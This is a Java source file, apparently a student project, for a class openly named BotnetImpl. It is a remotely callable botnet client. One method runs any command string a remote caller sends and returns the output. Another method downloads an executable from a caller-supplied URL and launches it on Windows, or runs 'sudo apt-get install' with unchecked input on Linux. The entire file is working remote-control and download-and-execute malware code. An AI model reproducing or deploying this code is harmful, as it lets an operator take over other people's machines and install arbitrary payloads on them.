/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package model;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author ann52
 */
public class BotnetImpl extends UnicastRemoteObject implements IBotnet{

    private String OS;
    
    public BotnetImpl() throws RemoteException {
        
    }

    public String getOS() {
        return OS;
    }

    public void setOS(String OS) {
        this.OS = OS;
    }
    
    @Override
    public void testing() throws RemoteException {
        System.out.println("This is running on client");
    }
    
    @Override
    public ArrayList<String> runCommand(String cmd) throws RemoteException {
        Process process;
        ArrayList<String> arr = new ArrayList<>();
        try {
            process = Runtime.getRuntime().exec(cmd);
            BufferedReader result = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String s = null;
            while ((s = result.readLine()) != null) {
                System.out.println(s);
                arr.add(s);
            }
        } catch (IOException ex) {
            arr = null;
        }
        return arr;
    }
    
    public ArrayList<String> winInstall(String command, String appLink){
        try{
            if (command.equals("install")) {
                String urlString = appLink;
                URL url = new URL(urlString);
                String[] temp = appLink.split("/");
                String fileLocation = temp[temp.length -1];
                InputStream in = url.openStream();
                File savedFile = new File(fileLocation);
                FileOutputStream fos = new FileOutputStream(savedFile);

                int length = -1;
                byte[] buffer = new byte[1024];
                while ((length = in.read(buffer)) > -1) {
                    fos.write(buffer, 0, length);
                }
                fos.close();
                in.close();
                // execute for windows
                String cmd = "cmd /c start " + savedFile.getAbsolutePath();
                return runCommand(cmd);
    //            Process child = Runtime.getRuntime().exec(cmd);
            }
        } catch (MalformedURLException ex) {
            Logger.getLogger(BotnetImpl.class.getName()).log(Level.SEVERE, null, ex);
        } catch (FileNotFoundException ex) {
            Logger.getLogger(BotnetImpl.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(BotnetImpl.class.getName()).log(Level.SEVERE, null, ex);
        }
        return null;
    }
    
    @Override
    public ArrayList<String> installApp(String app) throws RemoteException {
        setOS(System.getProperty("os.name").toLowerCase());
        
        if(getOS().contains("linux")){
            return runCommand("sudo apt-get install " + app +" -y");
        }
        else if(getOS().contains("mac")){
            return runCommand("/usr/local/bin/brew install " + app);
        }
        else if(getOS().contains("win")){
            return winInstall("install", app);
        }
        return null;
        
    }
    
}

